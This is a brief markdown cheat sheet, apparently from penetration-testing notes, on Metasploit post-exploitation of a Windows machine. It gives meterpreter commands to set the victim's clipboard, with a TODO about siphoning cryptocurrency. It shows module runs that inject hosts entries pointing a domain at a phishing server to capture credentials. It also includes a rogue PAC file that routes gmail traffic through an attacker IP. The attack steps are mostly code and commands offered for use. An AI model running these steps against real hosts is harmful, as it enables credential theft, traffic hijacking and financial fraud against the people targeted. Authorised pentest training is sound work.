# Metasploit

## Hijack Clipboard

TODO: Provide an example such as injecting a cryptocurrency to siphon's the victims financial accounts.

```
meterpeter > clipboard_set_text
```

## Inject DNS Hosts

Replace the domain with an attacker's IP address to capture credentials.

```
msf > use post/windows/manage/inject_host

msf post(windows/manage/inject_host) > run session=<session_ID> domain=<domain> ip=<phishing_server>
```

## Load Rouge HTTP Proxy

TODO: Show a step by step approach to setup a phishing webpage to capture credentials

Prepare a JavaScript to load it in the web browser through the attacker's phishing page.

```javascript
function FindProxyForURL(url, host) {
	if (shExpMatch(host, "www.gmail.com")) { 
		 return "PROXY <attacker_IP>:80; DIRECT";
	}
	if (shExpMatch(host, "www.shelliscoming.com")) { 
		return "PROXY <attacker_IP>:80; DIRECT";
	}
	if (url.substring(0, 6) == "https:") {
		return "DIRECT";
	}
}
```

```
msf > use post/windows/manage/ie_proxypac

msf post(windows/manage/ie_proxypac) > options

msf post(windows/manage/ie_proxypac) > run session=<session_ID> local_pac=/local/path/to/file.pac
```

Interact the `meterpreter` session to check if the proxy is injected.

```
msf post(windows/manage/ie_proxypac) > sessions -i <session_ID>

meterpreter > getproxy
```

---
## References

### Hacking Articles

- [Hacking Articles: Metasploit for Pentester - Clipboard](https://www.hackingarticles.in/metasploit-for-pentester-clipboard/)

### Shell is Coming

- [Shell is Coming: Controlling Internet Explorer user traffic through a proxy PAC file](https://www.shelliscoming.com/2013/12/metasploit-controlling-internet.html)